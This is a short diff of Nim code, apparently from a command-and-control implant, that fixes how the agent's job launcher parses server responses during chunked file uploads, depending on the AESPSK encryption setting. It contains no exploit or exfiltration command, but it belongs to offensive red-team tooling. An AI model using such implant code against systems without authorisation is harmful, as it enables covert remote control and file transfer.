@@ -201,7 +201,8 @@ proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): F
                   let resp = when defined(AESPSK): await Fetch(curConfig, $(uploadJson), true) else: await Fetch(curConfig, encode(curConfig.PayloadUUID & $(uploadJson)), true)
                   when not defined(release):
                      echo "resp for upload: ", $(resp)
-                  let parsedJsonresp = parseJson(decode(resp)[36 .. ^1])
+                  # let parsedJsonresp = parseJson(decode(resp)[36 .. ^1])
+                  let parsedJsonresp = when defined(AESPSK): parseJson(resp[36 .. ^1]) else: parseJson(decode(resp)[36 .. ^1]) 
                   jtemp.TotalChunks = parsedJsonresp["total_chunks"].getInt()
                   let uploadChunkData = parsedJsonresp["chunk_data"].getStr()
                   when not defined(release):
@@ -262,7 +263,8 @@ proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): F
                   let resp = when defined(AESPSK): await Fetch(curConfig, $(uploadJson), true) else: await Fetch(curConfig, encode(curConfig.PayloadUUID & $(uploadJson)), true)
                   when not defined(release):
                      echo "resp for upload: ", $(resp)
-                  let parsedJsonresp = parseJson(resp[36 .. ^1])
+                  # let parsedJsonresp = parseJson(resp[36 .. ^1])
+                  let parsedJsonresp = when defined(AESPSK): parseJson(resp[36 .. ^1]) else: parseJson(decode(resp)[36 .. ^1]) 
                   copyJob.TotalChunks = parsedJsonresp["total_chunks"].getInt()
                   let uploadChunkData = parsedJsonresp["chunk_data"].getStr()
                   when not defined(release):
